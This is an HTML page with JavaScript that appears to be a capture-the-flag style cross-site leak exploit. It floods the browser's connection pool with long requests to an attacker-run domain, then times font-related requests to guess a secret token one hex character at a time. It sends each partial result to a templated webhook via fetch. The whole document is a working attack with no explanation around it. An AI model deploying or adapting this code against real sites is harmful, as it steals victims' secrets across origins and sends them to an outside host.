<textarea id="log" style="width: 100%; height: 300px;"></textarea>

<script>
    LOG = 'Starting'
    SOCKETLIMIT = 255;
    MYSERVER = `sleep.xxxxxxx.xyz`
    
    done = false;
    let leaked_code = "";

    const logtextarea = document.getElementById("log");

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }

    const log = (l, type = 'INFO') => {
        const timestamp = new Date().toLocaleTimeString();
        let prefix = '[!] ';
        if (type === 'SUCCESS') {
            prefix = '[+] ';
        } else if (type === 'FAILURE') {
            prefix = '[x] ';
        }
        logtextarea.value += `[${timestamp}] ${prefix}${l}\n`;
        logtextarea.scrollTop = logtextarea.scrollHeight;
    }

    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;
        
        fetch(`http://sleep${i}.${MYSERVER}/120?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }

    const fetch_step_6 = async (i) => {
        let start = performance.now();
        await fetch(`http://aaaaa${i}.${MYSERVER}/0?q=${i}`, {
            mode: 'no-cors'
        });
    }
    
    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }
    
    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
        log(`Used ${i} connections`, 'INFO');
    }

    async function fetch_step_3(i){
        await fetch(`http://zzzz${i}.${MYSERVER}/0?q=${i}`, {
            mode: 'no-cors'
        });
        
        done = true;
    }
    
    async function leak_char(){
        done = false;
        let hashmap = {
            1: "A",
            2: "B",
            3: "C",
            4: "D",
            5: "E",
            6: "F",
            7: "0",
            8: "9",
            9: "8",
            10: "7",
            11: "6",
            12: "5",
            13: "4",
            14: "3",
            15: "2",
            16: "1"
        }

        let res_blocker_controller = await fetch_sleep_long(1337);
        await sleep(50);
        log(`Starting step 3...`, 'INFO');
        for(let i = 0; i < 5; i++){
            fetch_step_3(i)
        }

        log(`Waiting for font requests...`, 'INFO');

        // Wait until the first font is requested and then free the socket
        await sleep(4000)
        res_blocker_controller.abort();
    
        log(`Starting step 6...`, 'INFO');
        for(let i = 0; i < 32; i++){
            await fetch_step_6(i)

            if(done){
                return [hashmap[i + 1 - 2], hashmap[i - 2] || "A"];
            }

        }

        return null
    }

    async function main(){
        await sleep(1000);
        await exhaust_sockets();

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.1 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1]
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 1000)

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.2 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1]
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 11000)

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.3 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1]
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 21000)

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.4 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1]
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 31000)

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.5 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1]
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 41000)

        setTimeout(async () => {
            let result1 = await leak_char();
            log(`char n.6 guess: ${result1[1]}`, 'SUCCESS');
            leaked_code += result1[1];
            log(`Leaked code so far ${leaked_code}`, 'INFO');

            await fetch(`{{ webhook }}?token=${encodeURIComponent(leaked_code)}`, {
                mode: 'no-cors'
            });
        }, 51000)

    }

    main();
    
</script>
